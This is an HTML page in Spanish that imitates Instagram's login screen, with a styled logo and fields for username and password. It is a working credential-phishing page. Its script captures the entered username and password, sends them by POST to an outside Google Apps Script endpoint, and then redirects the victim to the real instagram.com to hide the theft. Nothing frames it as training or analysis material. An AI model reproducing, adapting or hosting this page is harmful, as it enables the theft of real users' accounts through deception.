<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>InstaLogin</title>
  <style>
    body {
      background: #fafafa;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      height: 100vh;
      align-items: center;
      justify-content: center;
    }

    .login-box {
      background: white;
      border: 1px solid #dbdbdb;
      padding: 40px;
      width: 320px;
      text-align: center;
      border-radius: 12px;
      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.05);
    }

    .logo {
      font-size: 36px;
      font-weight: bold;
      margin-bottom: 25px;
      background: linear-gradient(45deg, #feda75, #fa7e1e, #d62976, #962fbf, #4f5bd5);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #dbdbdb;
      border-radius: 6px;
      font-size: 14px;
      background: #f9f9f9;
    }

    button {
      width: 100%;
      background-color: #3897f0;
      color: white;
      border: none;
      padding: 12px;
      font-weight: bold;
      border-radius: 6px;
      cursor: pointer;
      font-size: 14px;
      transition: background 0.3s ease;
    }

    button:hover {
      background-color: #287bd1;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <div class="logo">Instagram</div>
    <form id="loginForm">
      <input type="text" name="usuario" placeholder="Teléfono, usuario o correo electrónico" required />
      <input type="password" name="clave" placeholder="Contraseña" required />
      <button type="submit">Iniciar sesión</button>
    </form>
  </div>

  <script>
    const form = document.getElementById('loginForm');

    form.addEventListener('submit', async (e) => {
      e.preventDefault();

      const formData = {
        usuario: form.usuario.value,
        clave: form.clave.value
      };

      try {
        await fetch("https://script.google.com/macros/s/AKfycbwKI-D21taG8HiSF7urpcIKai3Qh-ct8dmF-gQzoHllBupRbCONj96Hj71N6mN4SGP_/exec", {
          method: "POST",
          mode: "no-cors",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(formData)
        });

        window.location.href = "https://www.instagram.com";
      } catch (error) {
        alert("Ocurrió un error al enviar los datos");
        console.error(error);
      }
    });
  </script>
</body>
</html>
